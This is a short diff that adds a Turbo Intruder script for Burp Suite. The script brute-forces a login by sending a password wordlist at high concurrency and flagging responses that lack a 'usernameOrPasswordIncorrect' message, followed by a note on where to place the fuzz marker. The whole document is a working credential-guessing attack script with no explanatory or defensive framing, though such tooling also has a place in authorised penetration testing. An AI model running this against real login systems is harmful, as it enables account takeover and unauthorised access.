@@ -1,0 +1,23 @@
+# Script for Turbo Intruder
+
+###
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=50,
+                           requestsPerConnection=500,
+                           pipeline=False
+                           )
+
+    for word in open('c:/Users/user/Downloads/pass.txt'):
+        engine.queue(target.req, word.rstrip())
+
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if 'usernameOrPasswordIncorrect' not in req.response:
+        table.add(req)
+
+###
+
+user %s where to FUZZ
